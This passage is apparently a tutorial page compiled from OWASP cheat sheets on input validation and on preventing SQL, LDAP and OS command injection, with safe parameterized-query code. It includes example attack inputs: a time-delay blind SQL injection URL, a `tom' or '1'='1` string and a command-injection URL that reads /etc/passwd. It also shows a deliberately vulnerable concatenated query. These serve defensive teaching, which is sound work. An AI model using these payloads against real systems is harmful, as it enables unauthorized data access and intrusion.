---
title: "Injection and Input Handling"
order: 2
summary: "Untrusted input as an attack: validation, SQL and NoSQL injection, command and template injection, XXE, deserialization, uploads and prototype pollution."
category: "Security"
level: Intermediate
---

# Injection and Input Handling

Untrusted input as an attack: validation, SQL and NoSQL injection, command and template injection, XXE, deserialization, uploads and prototype pollution.

## Input Validation

> **Source:** [Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

Input validation checks whether data meets an application's requirements before the application uses it. It reduces the risk of malformed data, invalid business operations, and excessive resource consumption. [OWASP's Proactive Control C3](https://top10proactive.owasp.org/archive/2024/the-top-10/c3-validate-input-and-handle-exceptions/) distinguishes validation from the additional defenses needed when using that data:

- Use [parameterized queries](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) for SQL and [context-aware output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) to prevent cross-site scripting (XSS).
- Check [authorization](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) separately: a valid account identifier does not mean the caller may access that account.

### Input Validation Strategies

Validate both **syntax** (the expected type and format) and **semantics** (whether the value makes sense for the operation). For example, a booking needs valid dates and an end date after its start date. [CWE-20](https://cwe.mitre.org/data/definitions/20.html) describes these checks, including consistency between related fields.

Define rules for each field:

| Input | Rules to enforce |
| --- | --- |
| Fixed choices | Exact membership in the allowed set, including values submitted from drop-down menus |
| Numbers and dates | Expected type, accepted format, and minimum and maximum values |
| Strings | Length limits and the characters or structure required by the field |
| Objects | Allowed fields, required fields, and rules for missing or null values |
| Arrays | Minimum and maximum item counts and validation of every item, including nested objects |

#### Allowlist vs Denylist

Define what the application accepts and reject values outside those rules. Do not try to recognize every malicious string. Blocking apostrophes, for example, rejects legitimate names without making a database query safe. For free-form comments, an allowlist can permit broad Unicode text while limiting its length; it need not restrict users to letters and digits.

### Implementing Input Validation

#### Parse Safely, Then Validate

Apply request size limits before buffering or parsing input, and configure parser limits such as maximum nesting depth. JSON explicitly supports [implementation limits on size, depth, and numbers](https://www.rfc-editor.org/info/rfc8259/#section-9). A schema check after parsing cannot protect a parser that has already exhausted resources.

Use a maintained parser for the expected format, handle parsing failures, and validate the resulting values before business processing or storage. Configure parsers for untrusted input; see [XML External Entity Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#general-guidance) and [Deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html). Converting text to an integer only establishes a type: it does not establish an acceptable quantity.

Decode according to the protocol before checking field rules. Validate the representation that will actually be used, and avoid decoding it again downstream; [CWE-20](https://cwe.mitre.org/data/definitions/20.html) explains how inconsistent decoding can invalidate earlier checks.

#### Validate Structured Data

Use your framework's validators or a schema validator to enforce field rules. For JSON, explicitly configure [required and additional properties](https://json-schema.org/understanding-json-schema/reference/object); listing a property alone neither requires it nor rejects unknown fields. Apply schemas to nested objects and use [item schemas and array length limits](https://json-schema.org/understanding-json-schema/reference/array). Keep business checks, such as date ordering, alongside these structural checks.

Reject invalid requests with a clear error; do not continue with partially validated data. Bind only intended input fields to application objects; see [Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

#### Validating Free-form Unicode Text

Agree on a character encoding across components and reject malformed input. Preserve legitimate punctuation and scripts in names and comments. Where a field requires Unicode normalization for consistent comparison, define and apply the same policy before validation, storage, and comparison. [Unicode Standard Annex #15](https://www.unicode.org/reports/tr15/) defines the normalization forms and warns that compatibility normalization can erase meaningful distinctions. Normalization is not sanitization and does not replace output encoding.

#### Regular Expressions (Regex)

Use regular expressions for simple, structured fields. Require a match of the entire value, using an API such as [Python's `fullmatch`](https://docs.python.org/3/library/re.html#re.fullmatch) where available. Check the engine's character classes and newline behavior rather than assuming patterns behave identically across languages.

Bound input length before matching, avoid patterns with excessive backtracking, and use a non-backtracking engine or a match timeout where supported. Test valid, invalid, and near-matching values; [Microsoft's regex guidance](https://learn.microsoft.com/en-us/dotnet/standard/base-types/best-practices-regex) explains why near-matches can cause denial of service. Treat a timeout as validation failure.

#### Validating Rich User Content

When accepting user-authored HTML, use a maintained [HTML sanitization library](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization). Input validation and regular expressions cannot replace that control.

#### File Upload Validation

Treat the submitted filename and content type as untrusted metadata. Validate filenames after protocol decoding; an allowed extension alone does not establish safe content. Follow the [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) for content checks, size limits, storage, and safe serving.

#### Email Address Validation

Use a maintained email validation library compatible with the addresses your mail system supports. Format validation does not prove mailbox access. Follow [Email Validation and Verification](https://cheatsheetseries.owasp.org/cheatsheets/Email_Validation_and_Verification_Cheat_Sheet.html) for comparison policies, ownership verification, and email change workflows.

### Common Pitfalls

- **Client-only checks:** Validate on the server even when the browser checks the same fields. [Client-side validation is bypassable](https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Form_validation); use it for immediate feedback.
- **Trusting internal sources:** Validate data from internal APIs, partner feeds, queues, and stored records when it crosses a trust boundary. An internal transport does not establish that a value meets the receiving component's rules ([CWE-20](https://cwe.mitre.org/data/definitions/20.html)).
- **Denylisting or “cleaning” input:** Apply field-specific acceptance rules. Removing suspicious characters can change meaning and still does not provide query parameterization or output encoding.
- **Stopping at parsing or outer fields:** Test rejected ranges, missing fields, invalid nested items, and oversized arrays, not just malformed syntax.
- **Assuming regex or Unicode normalization makes data safe:** Check whole-value matching and resource limits; keep normalization consistent with the field's meaning.
- **Trusting upload metadata:** Use the file upload controls above; checking a filename is not checking the file's contents.
- **Logging rejected input verbatim:** Record the failure and relevant metadata without secrets or full request bodies. Escape any retained untrusted values for the log format to prevent log injection; see [Logging: Event collection](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#event-collection) and [Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).

## Injection Prevention

> **Source:** [Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This article is focused on providing clear, simple, actionable guidance for preventing the entire category of Injection flaws in your applications. Injection attacks, especially [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection), are unfortunately very common.

Application accessibility is a very important factor in protection and prevention of injection flaws. Only the minority of all applications within a company/enterprise are developed in house, where as most applications are from external sources. Open source applications give at least the opportunity to fix problems, but closed source applications need a different approach to injection flaws.

Injection flaws occur when an application sends untrusted data to an interpreter. Injection flaws are very prevalent, particularly in legacy code, often found in SQL queries, LDAP queries, XPath queries, OS commands, program arguments, etc. Injection flaws are easy to discover when examining code, but more difficult via testing. Scanners and fuzzers can help attackers find them.

Depending on the accessibility different actions must be taken in order to fix them. It is always the best way to fix the problem in source code itself, or even redesign some parts of the applications. But if the source code is not available or it is simply uneconomical to fix legacy software only virtual patching makes sense.

### Application Types

Three classes of applications can usually be seen within a company. Those 3 types are needed to identify the actions which need to take place in order to prevent/fix injection flaws.

#### A1: New Application

A new web application in the design phase, or in early stage development.

#### A2: Productive Open Source Application

An already productive application, which can be easily adapted. A Model-View-Controller (MVC) type application is just one example of having a easily accessible application architecture.

#### A3: Productive Closed Source Application

A productive application which cannot or only with difficulty be modified.

### Forms of Injection

There are several forms of injection targeting different technologies including SQL queries, LDAP queries, XPath queries and OS commands.

#### Query languages

The most famous form of injection is SQL Injection where an attacker can modify existing database queries. For more information see the [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).

But also LDAP, SOAP, XPath and REST based queries can be susceptible to injection attacks allowing for data retrieval or control bypass.

##### SQL Injection

An SQL injection attack consists of insertion or "injection" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application.

A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

SQL Injection attacks can be divided into the following three classes:

- **Inband:** data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.
- **Out-of-band:** data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).
- **Inferential or Blind:** there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.

###### How to test for the issue

###### During code review

please check for any queries to the database are not done via prepared statements.

If dynamic statements are being made please check if the data is sanitized before used as part of the statement.

Auditors should always look for uses of sp_execute, execute or exec within SQL Server stored procedures. Similar audit guidelines are necessary for similar functions for other vendors.

###### Automated Exploitation

Most of the situation and techniques below here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)

Equally Static Code Analysis Data flow rules can detect of unsanitized user controlled input can change the SQL query.

###### Stored Procedure Injection

When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.

###### Time delay Exploitation technique

The time delay exploitation technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).

```text
http://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false'))--
```

In this example the tester is checking whether the MySql version is 5.x or not, making the server delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn't need to wait for the response. Sometimes they can set a very high value (e.g. 100) and cancel the request after some seconds.

###### Out of band Exploitation technique

This technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester's server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section.

###### Remediation

###### Defense Option 1: Prepared Statements (with Parameterized Queries)

Prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker. In the safe example below, if an attacker were to enter the userID of `tom' or '1'='1`, the parameterized query would not be vulnerable and would instead look for a username which literally matched the entire string `tom' or '1'='1`.

###### Defense Option 2: Stored Procedures

The difference between prepared statements and stored procedures is that the SQL code for a stored procedure is defined and stored in the database itself, and then called from the application.

Both of these techniques have the same effectiveness in preventing SQL injection so your organization should choose which approach makes the most sense for you. Stored procedures are not always safe from SQL injection. However, certain standard stored procedure programming constructs have the same effect as the use of parameterized queries when implemented safely* which is the norm for most stored procedure languages.

*Note:* 'Implemented safely' means the stored procedure does not include any unsafe dynamic SQL generation.

###### Defense Option 3: Allow-List Input Validation

Various parts of SQL queries aren't legal locations for the use of bind variables, such as the names of tables or columns, and the sort order indicator (ASC or DESC). In such situations, input validation or query redesign is the most appropriate defense. For the names of tables or columns, ideally those values come from the code, and not from user parameters.

But if user parameter values are used to make different for table names and column names, then the parameter values should be mapped to the legal/expected table or column names to make sure unvalidated user input doesn't end up in the query. Please note, this is a symptom of poor design and a full rewrite should be considered if time allows.

###### Defense Option 4: Escaping All User-Supplied Input

This technique should only be used as a last resort, when none of the above are feasible. Input validation is probably a better choice as this methodology is frail compared to other defenses and we cannot guarantee it will prevent all SQL Injection in all situations.

This technique is to escape user input before putting it in a query. It's usually only recommended to retrofit legacy code when implementing input validation isn't cost effective.

###### Example code - Java

###### Safe Java Prepared Statement Example

The following code example uses a `PreparedStatement`, Java's implementation of a parameterized query, to execute the same database query.

```java
// This should REALLY be validated too
String custname = request.getParameter("customerName");
// Perform input validation to detect attacks
String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, custname);
ResultSet results = pstmt.executeQuery();
```

We have shown examples in Java, but practically all other languages, including Cold Fusion, and Classic ASP, support parameterized query interfaces.

###### Safe Java Stored Procedure Example

The following code example uses a `CallableStatement`, Java's implementation of the stored procedure interface, to execute the same database query. The `sp_getAccountBalance` stored procedure would have to be predefined in the database and implement the same functionality as the query defined above.

```java
// This should REALLY be validated
String custname = request.getParameter("customerName");
try {
 CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
 cs.setString(1, custname);
 ResultSet results = cs.executeQuery();
 // Result set handling...
} catch (SQLException se) {
 // Logging and error handling...
}
```

##### LDAP Injection

LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection). LDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree. For more information on LDAP Injection attacks, visit [LDAP injection](https://owasp.org/www-community/attacks/LDAP_Injection).

[LDAP injection](https://owasp.org/www-community/attacks/LDAP_Injection) attacks are common due to two factors:

1. The lack of safer, parameterized LDAP query interfaces
2. The widespread use of LDAP to authenticate users to systems.

###### How to test for the issue

###### During code review

Please check for any queries to the LDAP escape special characters, see [here](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#defense-option-1-escape-all-variables-using-the-right-ldap-encoding-function).

###### Automated Exploitation

Scanner module of tool like OWASP [ZAP](https://www.zaproxy.org/) have module to detect LDAP injection issue.

###### Remediation

###### Use the right LDAP encoding function

LDAP distinguished names and LDAP search filters require different escaping rules, defined by [RFC 4514](https://datatracker.ietf.org/doc/html/rfc4514) and [RFC 4515](https://datatracker.ietf.org/doc/html/rfc4515), respectively. Avoid custom escaping code and use a library encoder for the correct context. See the [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html) for current defenses and examples.

##### XPath Injection

See the [XPath Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XPath_Injection_Prevention_Cheat_Sheet.html) for defenses and a parameterized query example.

#### Scripting languages

All scripting languages used in web applications have a form of an `eval` call which receives code at runtime and executes it. If code is crafted using unvalidated and unescaped user input code injection can occur which allows an attacker to subvert application logic and eventually to gain local access.

Every time a scripting language is used, the actual implementation of the 'higher' scripting language is done using a 'lower' language like C. If the scripting language has a flaw in the data handling code '[Null Byte Injection](http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection)' attack vectors can be deployed to gain access to other areas in memory, which results in a successful attack.

#### Operating System Commands

OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands.

Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.

##### How to test for the issue

###### During code review

Check if any command execute methods are called and in unvalidated user input are taken as data for that command.

Out side of that, appending a semicolon to the end of a URL query parameter followed by an operating system command, will execute the command. `%3B` is URL encoded and decodes to semicolon. This is because the `;` is interpreted as a command separator.

Example: `http://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

If the application responds with the output of the `/etc/passwd` file then you know the attack has been successful. Many web application scanners can be used to test for this attack as they inject variations of command injections and test the response.

Equally Static Code Analysis tools check the data flow of untrusted user input into a web application and check if the data is then entered into a dangerous method which executes the user input as a command.

##### Remediation

If it is considered unavoidable the call to a system command incorporated with user-supplied, the following two layers of defense should be used within software in order to prevent attacks

1. **Parameterization** - If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help to provide the relevant quoting, encoding.
2. **Input validation** - the values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:
    - When it comes to the **commands** used, these must be validated against a list of allowed commands.
    - In regards to the **arguments** used for these commands, they should be validated using the following options:
        - Positive or allowlist input validation - where are the arguments allowed explicitly defined
        - Allow-list Regular Expression - where is explicitly defined a list of good characters allowed and the maximum length of the string. Ensure that metacharacters like `& | ; $ > < \` \ !` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers, and does not contain metacharacters. The length is also being limited to 3-10 characters:

`^[a-z0-9]{3,10}$`

##### Example code - Java

###### Incorrect Usage

```java
ProcessBuilder b = new ProcessBuilder("C:\\DoStuff.exe -arg1 -arg2");
```

This creates a builder with one command-list element, not a program followed by two arguments. [`ProcessBuilder`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html) represents the executable and its arguments as a list. The snippet does not start a process or demonstrate shell-command injection.

###### Correct Usage

This illustrative example starts a process with a modified working directory and passes the executable and each argument separately. Keep the executable and working directory trusted, and validate any untrusted arguments for the invoked program. Argument separation does not replace [argument validation](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#layer-2).

```java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");
Map<String, String> env = pb.environment();
pb.directory(new File("TrustedDir"));
Process p = pb.start();
```

#### Network Protocols

Web applications often communicate with network daemons (like SMTP, IMAP, FTP) where user input becomes part of the communication stream. Here it is possible to inject command sequences to abuse an established session.

### Injection Prevention Rules

#### Rule \#1 (Perform proper input validation)

Perform proper input validation. Positive or allowlist input validation with appropriate canonicalization is also recommended, but **is not a complete defense** as many applications require special characters in their input.

#### Rule \#2 (Use a safe API)

The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface. Be careful of APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood.

#### Rule \#3 (Contextually escape user data)

If a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter.

### Other Injection Cheatsheets

[SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

[OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

[LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)

[Injection Prevention Cheat Sheet in Java](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html)

## SQL Injection Prevention

> **Source:** [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This cheat sheet will help you prevent SQL injection flaws in your applications. It will define what SQL injection is, explain where those flaws occur, and provide four options for defending against SQL injection attacks. [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) attacks are common because:

1. SQL Injection vulnerabilities are very common.
2. The application's database is a frequent target for attackers because it typically contains sensitive or critical data.

### What Is a SQL Injection Attack?

Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user-supplied input. To avoid SQL injection flaws, developers need to:

1. Stop writing dynamic queries with string concatenation.
2. Prevent malicious SQL input from being included in executed queries.

There are simple techniques for preventing SQL injection vulnerabilities, and they can be used with practically any kind of programming language and any type of database. While XML databases can have similar problems (e.g., XPath and XQuery injection), these techniques can be used to protect them as well.

### Anatomy of a Typical SQL Injection Vulnerability

A common SQL injection flaw in Java is shown below. Because its unvalidated "customerName" parameter is simply appended to the query, an attacker can enter SQL code into that query and the application would take the attacker's code and execute it on the database.

```java
String query = "SELECT account_balance FROM user_data WHERE user_name = "
             + request.getParameter("customerName");
try {
    Statement statement = connection.createStatement( ... );
    ResultSet results = statement.executeQuery( query );
}

...
```

### Primary Defenses

- **Option 1: Use of Prepared Statements (with Parameterized Queries)**
- **Option 2: Use of Properly Constructed Stored Procedures**
- **Option 3: Allow-list Input Validation**
- **Option 4: STRONGLY DISCOURAGED: Escaping All User Supplied Input**

#### Defense Option 1: Prepared Statements (with Parameterized Queries)

When developers are taught how to write database queries, they should be told to use prepared statements with variable binding (aka parameterized queries). Prepared statements are simple to write and easier to understand than dynamic queries, and parameterized queries force the developer to define all SQL code first and pass in each parameter to the query later.

If database queries use this coding style, the database will always distinguish between code and data, regardless of what user input is supplied. Also, prepared statements ensure that an attacker cannot change the intent of a query, even if SQL commands are inserted by an attacker.

##### Safe Java Prepared Statement Example

In the safe Java example below, if an attacker were to enter the userID as `tom' or '1'='1`, the parameterized query would look for a username that literally matches the entire string `tom' or '1'='1`. Thus, the database would be protected against injections of malicious SQL code.

The following code example uses a `PreparedStatement`, Java's implementation of a parameterized query, to execute the same database query.

```java
// This should REALLY be validated too
String custname = request.getParameter("customerName");
// Perform input validation to detect attacks
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custname);
ResultSet results = pstmt.executeQuery( );
```

##### Safe C\# .NET Prepared Statement Example

In .NET, the creation and execution of the query doesn't change. Just pass the parameters to the query using the `Parameters.Add()` call as shown below.

```csharp
String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
try {
  OleDbCommand command = new OleDbCommand(query, connection);
  command.Parameters.Add(new OleDbParameter("customerName", CustomerName.Text));
  OleDbDataReader reader = command.ExecuteReader();
  // …
} catch (OleDbException se) {
  // error handling
}
```

While we have shown examples in Java and .NET, practically all other languages (including Cold Fusion and Classic ASP) support parameterized query interfaces. Even SQL abstraction layers, like the [Hibernate Query Language](http://hibernate.org/) (HQL) with the same type of injection problems (called [HQL Injection](http://cwe.mitre.org/data/definitions/564.html))  support parameterized queries as well:

##### Hibernate Query Language (HQL) Prepared Statement (Named Parameters) Example

```java
// This is an unsafe HQL statement
Query unsafeHQLQuery = session.createQuery("from Inventory where productID='"+userSuppliedParameter+"'");
// Here is a safe version of the same query using named parameters
Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");
safeHQLQuery.setParameter("productid", userSuppliedParameter);
```

##### Other Examples of Safe Prepared Statements

If you need examples of prepared queries/parameterized languages, including Ruby, PHP, Cold Fusion, Perl, and Rust, see the [Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) or this [site](http://bobby-tables.com/).

Generally, developers like prepared statements because all the SQL code stays within the application, which makes applications relatively database independent.

#### Defense Option 2: Stored Procedures

Though stored procedures are not always safe from SQL injection, developers can use certain standard stored procedure programming constructs. This approach has the same effect as using parameterized queries, as long as the stored procedures are implemented safely (which is the norm for most stored procedure languages).

##### Safe Approach to Stored Procedures

If stored procedures are needed, the safest approach to using them requires the developer to build SQL statements with parameters that are automatically parameterized, unless the developer does something largely out of the norm. The difference between prepared statements and stored procedures is that the SQL code for a stored procedure is defined and stored in the database itself, then called from the application. Since prepared statements and safe stored procedures are equally effective in preventing SQL injection, your organization should choose the approach that makes the most sense for you.

##### When Stored Procedures Can Increase Risk

Occasionally, stored procedures can increase risk when a system is attacked. For example, on MS SQL Server, you have three main default roles: `db_datareader`, `db_datawriter` and `db_owner`. Before stored procedures came into use, DBAs would give `db_datareader` or `db_datawriter` rights to the webservice's user, depending on the requirements.

However, stored procedures require execute rights, a role not available by default. In some setups where user management has been centralized, but is limited to those 3 roles, web apps would have to run as `db_owner` so stored procedures could work. Naturally, that means that if a server is breached, the attacker has full rights to the database, where previously, they might only have had read-access.

##### Safe Java Stored Procedure Example

The following code example uses Java's implementation of the stored procedure interface (`CallableStatement`) to execute the same database query. The `sp_getAccountBalance` stored procedure has to be predefined in the database and use the same functionality as the query above.

```java
// This should REALLY be validated
String custname = request.getParameter("customerName");
try {
  CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
  cs.setString(1, custname);
  ResultSet results = cs.executeQuery();
  // … result set handling
} catch (SQLException se) {
  // … logging and error handling
}
```

##### Safe VB .NET Stored Procedure Example

The following code example uses a `SqlCommand`, .NET's implementation of the stored procedure interface, to execute the same database query. The `sp_getAccountBalance` stored procedure must be predefined in the database and use the same functionality as the query defined above.

```vbnet
 Try
   Dim command As SqlCommand = new SqlCommand("sp_getAccountBalance", connection)
   command.CommandType = CommandType.StoredProcedure
   command.Parameters.Add(new SqlParameter("@CustomerName", CustomerName.Text))
   Dim reader As SqlDataReader = command.ExecuteReader()
   '...
 Catch se As SqlException
   'error handling
 End Try
```

#### Defense Option 3: Allow-list Input Validation

If you are faced with parts of SQL queries that can't use bind variables, such as table names, column names, or sort order indicators (ASC or DESC), input validation or query redesign is the most appropriate defense. When table or column names are needed, ideally those values come from the code and not from user parameters.

##### Sample Of Safe Table Name Validation

WARNING: Using user parameter values to target table or column names is a symptom of poor design and a full rewrite should be considered if time allows. If that is not possible, developers should map the parameter values to the legal/expected table or column names to make sure unvalidated user input doesn't end up in the query.

In the example below, since `tableName` is identified as one of the legal and expected values for a table name in this query, it can be directly appended to the SQL query. Keep in mind that generic table validation functions can lead to data loss if table names are used in queries where they are not expected.

```text
String tableName;
switch(PARAM):
  case "Value1": tableName = "fooTable";
                 break;
  case "Value2": tableName = "barTable";
                 break;
  ...
  default      : throw new InputValidationException("unexpected value provided"
                                                  + " for table name");
```

##### Safest Use Of Dynamic SQL Generation (DISCOURAGED)

When we say a stored procedure is "implemented safely," that means it does not include any unsafe dynamic SQL generation. Developers do not usually generate dynamic SQL inside stored procedures. However, it can be done, but should be avoided.

If it can't be avoided, the stored procedure must use input validation or proper escaping, as described in this article, to make sure that all user supplied input to the stored procedure can't be used to inject SQL code into the dynamically generated query. Auditors should always look for uses of `sp_execute`, `execute` or `exec` within SQL Server stored procedures. Similar audit guidelines are necessary for similar functions for other vendors.

##### Sample of Safer Dynamic Query Generation (DISCOURAGED)

For something simple like a sort order, it is best if the user supplied input is converted to a boolean, and then that boolean is used to select the safe value to append to the query. This is a very standard need in dynamic query creation.

For example:

```java
public String someMethod(boolean sortOrder) {
 String SQLquery = "some SQL ... order by Salary " + (sortOrder ? "ASC" : "DESC");
 ...
```

Any time user input can be converted to a non-String, like a date, numeric, boolean, enumerated type, etc. before it is appended to a query, or used to select a value to append to the query, this ensures it is safe to do so.

Input validation is also recommended as a secondary defense in ALL cases, even when using bind variables as discussed earlier in this article. More techniques on how to implement strong input validation techniquies are described in the [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).

#### Defense Option 4: STRONGLY DISCOURAGED: Escaping All User-Supplied Input

In this approach, the developer will escape all user input before putting it in a query. It is very database specific in its implementation.  This methodology is fragile compared to other defenses, and we CANNOT guarantee that this option will prevent all SQL injections in all situations.

If an application is built from scratch or requires low risk tolerance, it should be built or re-written using parameterized queries, stored procedures, or some kind of Object Relational Mapper (ORM) that builds your queries for you.

### Additional Defenses

Beyond adopting one of the four primary defenses, we also recommend adopting all of these additional defenses to provide defense in depth. These additional defenses are:

- **Least Privilege**
- **Allow-list Input Validation**

#### Least Privilege

To minimize the potential damage of a successful SQL injection attack, you should minimize the privileges assigned to every database account in your environment. Start from the ground up to determine what access rights your application accounts require, rather than trying to figure out what access rights you need to take away.

Make sure that accounts that only need read access are only granted read access to the tables they need access to. DO NOT ASSIGN DBA OR ADMIN TYPE ACCESS TO YOUR APPLICATION ACCOUNTS. We understand that this is easy, and everything just "works" when you do it this way, but it is very dangerous.

##### Minimizing Application and OS Privileges

SQL injection is not the only threat to your database data. Attackers can simply change the parameter values from one of the legal values they are presented with, to a value that is unauthorized for them, but the application itself might be authorized to access. As such, minimizing the privileges granted to your application will reduce the likelihood of such unauthorized access attempts, even when an attacker is not trying to use SQL injection as part of their exploit.

While you are at it, you should minimize the privileges of the operating system account that the DBMS runs under. Don't run your DBMS as root or system! Most DBMSs run out of the box with a very powerful system account. For example, MySQL runs as system on Windows by default! Change the DBMS's OS account to something more appropriate, with restricted privileges.

##### Details Of Least Privilege When Developing

If an account only needs access to portions of a table, consider creating a view that limits access to that portion of the data and assigning the account access to the view instead of the underlying table. Rarely, if ever, grant create or delete access to database accounts.

If you adopt a policy where you use stored procedures everywhere, and don't allow application accounts to directly execute their own queries, then restrict those accounts to only be able to execute the stored procedures they need. Don't grant them any rights directly to the tables in the database.

##### Least Admin Privileges For Multiple DBs

The designers of web applications should avoid using the same owner/admin account in the web applications to connect to the database. Different DB users should be used for different web applications.

In general, each separate web application that requires access to the database should have a designated database user account that the application will use to connect to the DB. That way, the designer of the application can have good granularity in the access control, thus reducing the privileges as much as possible. Each DB user will then have select access to only what it needs, and write-access as needed.

As an example, a login page requires read access to the username and password fields of a table, but no write access of any form (no insert, update, or delete). However, the sign-up page certainly requires insert privilege to that table; this restriction can only be enforced if these web apps use different DB users to connect to the database.

##### Enhancing Least Privilege with SQL Views

You can use SQL views to further increase the granularity of access by limiting the read access to specific fields of a table or joins of tables. It could have additional benefits.

For example, a product catalog can use a view that exposes product names and retail prices while omitting supplier costs. Grant the application's database account only `SELECT` access to that view, without access to the underlying table or other objects that expose the omitted fields. Verify your database's view privilege rules; for example, [PostgreSQL normally checks underlying table access using the view owner's privileges](https://www.postgresql.org/docs/current/sql-createview.html).

This limits the data exposed through a compromised application account. Queries against views still require parameterization to prevent SQL injection.

#### Allow-list Input Validation

